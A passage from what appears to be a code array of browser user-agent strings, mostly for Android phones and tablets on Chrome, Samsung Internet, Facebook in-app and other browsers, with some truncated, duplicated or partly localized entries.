  "Mozilla/5.0 (Linux; Android 11; SM-M315F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 YaBrowser/22.1.0.194 (lite) Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-G998U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 EdgA/109.0.0.0",
  "Mozilla/5.0 (Linux; Android 12; SM-G998W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 EdgA/108.0.1462.15",
  "Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.28 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-M315FD Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 WpsMoffice/16.4/arm64-v8a/1334",
  "Mozilla/5.0 (Linux; Android 12; SM-M315L Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 WpsMoffice/16.3.3/arm64-v8a/1329",
  "Mozilla/5.0 (Linux; Android 12; SM-M315N Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.24.109;]",
  "Mozilla/5.0 (Linux; Android 12; SM-M315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Mobile Safari/537.36 EdgA/104.0.1293.47",
  "Mozilla/5.0 (Linux; Android 10; SM-M315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 AlohaLite/1.5.0 AlohaBrowser/2.14.1",
  "Mozilla/5.0 (Linux; Android 11; SM-M315K Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 YaBrowser/22.1.0.194 (lite) Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-G998U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 EdgA/109.0.0.0",
  "Mozilla/5.0 (Linux; Android 12; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 EdgA/108.0.1462.15",
  "Mozilla/5.0 (Linux; Android 12; SM-G998F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.28 Mobile Safari/537.36", 
  "Mozilla/5.0 (Linux; U; Android 12; SM-G998U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/8.7.2254.57455"
  "Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.22 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 11; SM-G998U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/8.7.2254.57455",
  "Mozilla/5.0 (Linux; Android 12; SM-G9980 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Line/12.15.1/IAB",
  "Mozilla/5.0 (Linux; U; Android 12; SM-A526U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/8.7.2254.57310",
  "Mozilla/5.0 (Linux; U; Android 12; SM-A526U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/8.7.2254.57455",
  "Mozilla/5.0 (Linux; U; Android 12; SM-A526U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36 OPR/8.7.2254.57455",
  "Mozilla/5.0 (Linux; Android 12; SM-A526U1 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.65 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 12; SM-A526U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 OPR/8.6.2254.56868",
  "Mozilla/5.0 (Linux; Android 11; SM-A526U1 Build/RP1A.200720.012; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 BingSapphire/23.0.400802306",
  "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A526U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A526B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/372.0.0.10.112;]",
  "Mozilla/5.0 (Linux; Android 12; SM-A526W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Mobile Safari/537.36 EdgA/81.0.416.58",
  "Mozilla/5.0 (Linux; Android 12; SM-A315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36 OkKey/CBAFJIICABABABABA OKAndroid/22.6.7 b22060700 OkApp",
  "Mozilla/5.0 (Linux; Android 12; SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A315G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/389.0.0.42.111;]",
  "Mozilla/5.0 (Linux; Android 11; SM-A315G Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.77 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A315G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.77 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/225.0.0.12.114;]",
  "Mozilla/5.0 (Linux; Android 10; SM-A315G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/284.0.0.16.119;]",
  "Mozilla/5.0 (Linux; Android 10; SM-A315G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/217.0.0.14.121;]",
  "Mozilla/5.0 (Linux; Android 10; SM-A315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36 Flipboard/4.2.49/4925,4.2.49.4925",
  "Mozilla/5.0 (Linux; Android 10; SM-A315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 Flipboard/4.2.45/4889,4.2.45.4889",
  "Mozilla/5.0 (Linux; Android 13; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.3 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G977N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36",
   "Mozilla/5.0 (Linux; Android 11; Zenfone Max Pro M1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 11; Redmi K20 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 11; J8110) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 11; XQ-AT52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 11; SM-T870 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Safari/537.36",
     "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.1.3381.61266",
     "Mozilla/5.0 (Linux; Android 12; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 12; moto g(8) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Mobile Safari/537.36 EdgA/96.0.1054.36",
     "Mozilla/5.0 (Linux; Android 12; Redmi Note 5 Build/SP1A.211105.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 12; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420",
     "Mozilla/5.0 (Linux; Android 12; SM-G998U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; U; Android 12; en-US; SM-G998U1 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; Zenfone Max Pro M1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; MI 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; ASUS_X01BDA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; MI 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; Redmi K20 Pro Premium Edition) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; YAL-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; Pixel 3a XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.36 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 9; Pixel 2 XL Build/PPR2.181005.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 9; Micromax E453 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 9; Redmi 4A Build/PPR2.181005.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Pro Build/PPR2.181005.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 9; moto g(6) Build/PDY29.48) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 9; ASUS_Z017DB Build/PPR2.181005.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 9; MIX 2S Build/PKQ1.180729.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 8.1.0; SM-N960U Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.123 Mobile Safari/537.36 EdgA/42.0.0.2305",
     "Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; TECNO IN6 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.8.8.1140 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; vivo 1803 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 UCBrowser/11.4.8.1012 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; PBAT00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.6.2",
     "Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; PBAT00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.6.2",
     "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM6.171019.030.E1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.85 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 8.1.0; Pixel 2 XL Build/OPM2.171019.029) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.85 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G925F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A720F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A310F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J700H) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J210F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
	 "Mozilla/5.0 (Linux; Android 11; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.116 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",

     "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.4 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91",

     "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.3.2249.130976",

     "Mozilla/5.0 (Linux; Android 11; SM-P610 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Safari/537.36",
     
       "Mozilla/5.0 (Linux; Android 11; Lenovo TB-7306F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/hu_HU;FBAV/323.0.0.9.106;]",
   "Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.3 Mobile Safari/537.36",
	   "Mozilla/5.0 (Linux; Android 12; Pixel 3a XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 12; SM-A536N Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.232 Whale/1.0.0.0 Crosswalk/26.90.3.25 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 12; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 12; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 12; SM-G991U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; arm_64; Android 12; M2102J20SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.7.71.00 SA/3 Mobile Safari/537.36",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E14",
       "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A325F/A325FXXU2AVB3) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Ch",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Amazonb",
       "Mozilla/5.0 (Linux; Android 11; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 9; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 (Eco",
       "Mozilla/5.0 (Linux; Android 11; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 11; V2109) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QP1A.191005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; HD1905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; LIO-AL00 Build/HUAWEILIO-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.64 HuaweiBrowser/10.0.2.311 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; Redmi 3S Build/QD1A.190821.014; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/7.8.3.40913AP",
       "Mozilla/5.0 (Linux; Android 10; Moto G5 Plus (XT1686)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 9; CPH1931) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; U; Android 9; zh-tw; ONEPLUS A6010 Build/PKQ1.180716.001) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1",
       "Mozilla/5.0 (Linux; Android 9; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; itel W4001 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/295.0.0.10.119;]",
       "Mozilla/5.0 (Linux; Android 10; itel A571W Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/298.0.0.10.115;]",
       "Mozilla/5.0 (Linux; Android 10; R7_1 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/317.0.0.12.104;]",
       "Mozilla/5.0 (Linux; Android 11; 5033XR Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/337.0.0.7.102;]",
       "Mozilla/5.0 (Linux; Android 10; itel W4001 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/295.0.0.10.119;]",
       "Mozilla/5.0 (Linux; Android 8.1.0; Sunny3 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML، مانند Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.1019.36; FBAV/319.0.0.7.107؛]",
       "Mozilla/5.0 (Linux; Android 8.1.0; Sunny3 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/319.0.0.7.107;]",
       "Mozilla/5.0 (Linux; Android 8.1.0; Redmi S2 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; itel A571W Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/298.0.0.10.115;]",
       "Mozilla/5.0 (Linux; Android 10; TITAN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML، مانند Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.3EMAn; 332.0.0.22.108؛]",
       "Mozilla/5.0 (Linux; Android 10; itel A571W Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/298.0.0.10.115;]",
       "Mozilla/5.0 (Linux; Android 6.0; LG-K371 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/337.0.0.7.102;]",
       "Mozilla/5.0 (Linux; Android 11; CTR-LX2 Build/HUAWEICTR-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.15.96;]",
       "Mozilla/5.0 (Linux; Android 8.1.0; R1 Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]",
       "Mozilla/5.0 (Linux; Android 11; DQR22 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/317.0.0.12.104;]",
       "Mozilla/5.0 (Linux; Android 10; itel W5004D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/240.0.0.9.115;]",
       "Mozilla/5.0 (Linux; Android 10; itel W5004D Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/240.0.0.9.115;]",
